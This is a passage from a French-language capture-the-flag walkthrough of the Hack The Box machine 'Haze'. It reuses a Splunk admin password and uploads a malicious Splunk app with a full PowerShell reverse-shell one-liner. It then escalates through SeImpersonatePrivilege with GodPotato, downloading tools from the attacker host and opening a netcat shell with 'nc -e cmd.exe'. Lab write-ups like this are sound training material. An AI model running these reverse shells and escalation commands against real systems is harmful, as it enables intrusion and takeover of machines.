bindDNpassword = $1$YDz8WfhoCWmf6aTRkA+QqUI=
charset = utf8
emailAttribute = mail
enableRangeRetrieval = 0
groupBaseDN = CN=Splunk_Admins,CN=Users,DC=haze,DC=htb
groupMappingAttribute = dn
groupMemberAttribute = member
groupNameAttribute = cn
host = dc01.haze.htb
nestedGroups = 0
network_timeout = 20
pagelimit = -1
port = 389
realNameAttribute = cn
sizelimit = 1000
timelimit = 15
userBaseDN = CN=Users,DC=haze,DC=htb
userNameAttribute = samaccountname

[authentication]
authSettings = Haze LDAP Auth
authType = LDAP#
```


Mais il ne s'agit pas du mot de passe sur la machine.
```shell
╭─root@exegol-hackthebox /workspace/Haze/Splunk
╰─➤  nxc smb dc01.haze.htb -u 'alexander.green' -p 'Sp1unkadmin@2k24'
SMB         10.129.27.127   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (signing:True) (SMBv1:False)
SMB         10.129.27.127   445    DC01             [-] haze.htb\alexander.green:Sp1unkadmin@2k24 STATUS_LOGON_FAILURE
```


Je vois que `alexander.green` est membre du groupe `splunk_admins`.
![](/images/Haze/Haze-8.png)


### Reverse shell Splunk

Ce mot de passe est plutôt utilisé pour ce connecter à Splunk en tant qu'administrateur avec les identifiants `admin:Sp1unkadmin@2k24`. Je me connecte alors et j'arrive sur l'interface administrateur.
![](/images/Haze/Haze-9.png)


Là, je recherche sur google comment avoir un reverse shell avec Splunk vu que je suis l'administrateur et que je peux créer des applications. Je trouve alors sur ce [Github](https://github.com/0xjpuff/reverse_shell_splunk). Je clone le repo GitHub sur ma machine. Ensuite je modifie le contenu du fichier `bin/run.ps1` pour y mettre mon adresse IP ainsi que le port d'écoute.
```shell
╭─root@exegol-hackthebox /workspace/Haze
╰─➤  git clone https://github.com/0xjpuff/reverse_shell_splunk.git
Cloning into 'reverse_shell_splunk'...
remote: Enumerating objects: 23, done.
remote: Total 23 (delta 0), reused 0 (delta 0), pack-reused 23 (from 1)
Receiving objects: 100% (23/23), 5.16 KiB | 2.58 MiB/s, done.
Resolving deltas: 100% (4/4), done.

╭─root@exegol-hackthebox /workspace/Haze/reverse_shell_splunk  ‹master*›
╰─➤  tree
.
├── README.md
└── reverse_shell_splunk
    ├── bin
    │   ├── rev.py
    │   ├── run.bat
    │   └── run.ps1
    └── default
        └── inputs.conf

4 directories, 5 files

╭─root@exegol-hackthebox /workspace/Haze/reverse_shell_splunk/reverse_shell_splunk  ‹master*›
╰─➤  cat bin/run.ps1
#A simple and small reverse shell. Options and help removed to save space.
#Uncomment and change the hardcoded IP address and port number in the below line. Remove all help comments as well.
$client = New-Object System.Net.Sockets.TCPClient('10.10.16.33',9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```


Ensuite je compresse le dossier en `.tgz`. Puis je renomme le fichier en `.spl`.
```shell
╭─root@exegol-hackthebox /workspace/Haze/reverse_shell_splunk  ‹master*›
╰─➤  tar -cvzf z3rodol.tgz reverse_shell_splunk
reverse_shell_splunk/
reverse_shell_splunk/bin/
reverse_shell_splunk/bin/run.ps1
reverse_shell_splunk/bin/run.bat
reverse_shell_splunk/bin/rev.py
reverse_shell_splunk/default/
reverse_shell_splunk/default/inputs.conf
╭─root@exegol-hackthebox /workspace/Haze/reverse_shell_splunk  ‹master*›
╰─➤  mv z3rodol.tgz z3rodol.spl
```


Je me rends au niveau de `Apps`, je clique sur `Manage Apps` puis sur `Install app from file` afin d'uploader le fichier.
![](/images/Haze/Haze-10.png)
![](/images/Haze/Haze-11.png)


Juste après avoir uploader le fichier, il y a une connexion vers mon listener. J'ai alors un shell en tant qu'`alexander.green`.
```shell
╭─root@exegol-hackthebox /workspace/Haze/reverse_shell_splunk  ‹master*›
╰─➤  rlwrap nc -lvnp 9001
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
Ncat: Connection from 10.129.27.127.
Ncat: Connection from 10.129.27.127:61039.
whoami
haze\alexander.green
PS C:\Windows\system32>
```


## Shell en tant que nt/authority
### SeImpersonatePrivilege

En regardant les privilèges d'`alexander.green`, je vois qu'il possède le privilège `SeImpersonatePrivilege`. Ce qui signifie qu'il peut usurper l'identité de n'importe quel utilisateur.
```powershell
PS C:\Windows\system32> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```


### GodPotato

Pour exploiter cette vulnérabilité, je peux utiliser pour cela comme sur la machine [Scrambled](https://z3rodol.github.io/posts/Scrambled/#seimpersonateprivilege), `GodPotato`. Donc je l'uploade lui et la version Windows de `netcat`.
```powershell
PS C:\users\alexander.green\appdata\local\temp> curl http://10.10.16.33:8000/GodPotato-NET4.exe -o gp.exe
PS C:\users\alexander.green\appdata\local\temp> curl http://10.10.16.33:8000/nc.exe -o nc.exe
PS C:\users\alexander.green\appdata\local\temp> ls


    Directory: C:\users\alexander.green\appdata\local\temp


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         7/31/2025   2:28 PM          57344 gp.exe
-a----         7/31/2025   2:30 PM          29696 nc.exe
-a----         7/31/2025   2:22 PM            970 tmpbhy8cmyd


PS C:\users\alexander.green\appdata\local\temp> ./gp.exe -cmd "C:\users\alexander.green\appdata\local\temp\nc.exe -e cmd.exe 10.10.16.33 4444"
```

Avant ça je lance mon listener et j'obtiens alors un shell en tant que `nt/autority`.
```powershell
╭─root@exegol-hackthebox /workspace/Haze
╰─➤  rlwrap nc -lvnp 4444
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.129.27.127.
Ncat: Connection from 10.129.27.127:51640.
Microsoft Windows [Version 10.0.20348.3328]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami

C:\Windows\system32>cd /users/administrator/desktop
cd /users/administrator/desktop

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 3985-943C

 Directory of C:\Users\Administrator\Desktop

03/05/2025  06:46 PM    <DIR>          .
03/05/2025  12:29 AM    <DIR>          ..
07/31/2025  12:23 PM                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   4,354,617,344 bytes free

C:\Users\Administrator\Desktop>type root.txt
type root.txt
a45fe2ba955abf105193d5b2c4fd9157
```
